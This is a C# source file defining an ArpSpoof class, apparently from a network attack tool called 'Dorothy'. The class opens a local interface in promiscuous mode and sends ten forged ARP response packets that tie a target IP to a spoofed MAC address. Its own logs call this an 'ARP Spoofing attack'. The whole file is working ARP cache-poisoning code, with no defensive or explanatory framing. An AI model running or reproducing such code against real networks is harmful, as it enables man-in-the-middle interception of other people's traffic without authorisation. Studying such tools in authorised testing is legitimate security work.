using System;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Net;
using System.Linq;

namespace Dorothy.Models
{
    public class ArpSpoof : IDisposable
    {
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly PhysicalAddress _targetMac;
        private readonly PhysicalAddress _spoofedMac;
        private CancellationTokenSource _cancellationTokenSource;
        private LibPcapLiveDevice _device;
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();

        public ArpSpoof(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, byte[] spoofedMac, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = new PhysicalAddress(targetMac);
            _spoofedMac = new PhysicalAddress(spoofedMac);
            _cancellationTokenSource = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting ARP Spoofing attack.");
            try
            {
                // Get all available network interfaces
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Interface.Addresses
                        .Any(a => a.Addr != null && 
                                 a.Addr.ipAddress != null && 
                                 a.Addr.ipAddress.ToString().StartsWith("192.168")));

                if (_device == null)
                {
                    // Fallback to any active interface if no matching IP found
                    _device = CaptureDeviceList.Instance
                        .OfType<LibPcapLiveDevice>()
                        .FirstOrDefault(d => d.Interface.Addresses
                            .Any(a => a.Addr != null && 
                                     a.Addr.ipAddress != null));
                }

                if (_device == null)
                {
                    throw new Exception("No active network interface found. Please check your network connection.");
                }

                _device.Open(DeviceModes.Promiscuous);

                int packetCount = 0;
                await Task.Run(async () =>
                {
                    while (!_cancellationTokenSource.Token.IsCancellationRequested && packetCount < 10)
                    {
                        SendArpPacket(_sourceIp, _sourceMac, _targetIp, _targetMac);
                        packetCount++;
                        Logger.Info($"Sent ARP packet {packetCount}/10");
                        await Task.Delay(1000, _cancellationTokenSource.Token);
                    }
                    
                    // Auto-stop after 10 packets
                    if (packetCount >= 10)
                    {
                        Logger.Info("ARP Spoofing completed - sent 10 packets");
                        Dispose();
                    }
                }, _cancellationTokenSource.Token);

                Logger.Info($"ARP Spoofing attack started successfully on interface: {_device.Interface.FriendlyName}");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Failed to start ARP Spoofing attack.");
                throw;
            }
        }

        public void Dispose()
        {
            try
            {
                _cancellationTokenSource.Cancel();
                _cancellationTokenSource.Dispose();
                _device?.Close();
                _device?.Dispose();
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error during disposal");
            }
        }

        private void SendArpPacket(string senderIp, PhysicalAddress senderMac, string targetIp, PhysicalAddress targetMac)
        {
            try
            {
                var ethernetPacket = new EthernetPacket(
                    _spoofedMac,
                    targetMac,
                    EthernetType.Arp);

                var arpPacket = new ArpPacket(
                    ArpOperation.Response,
                    targetMac,
                    IPAddress.Parse(targetIp),
                    _spoofedMac,
                    IPAddress.Parse(senderIp));

                ethernetPacket.PayloadPacket = arpPacket;
                _device.SendPacket(ethernetPacket);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Failed to send ARP packet");
                throw;
            }
        }
    }
} 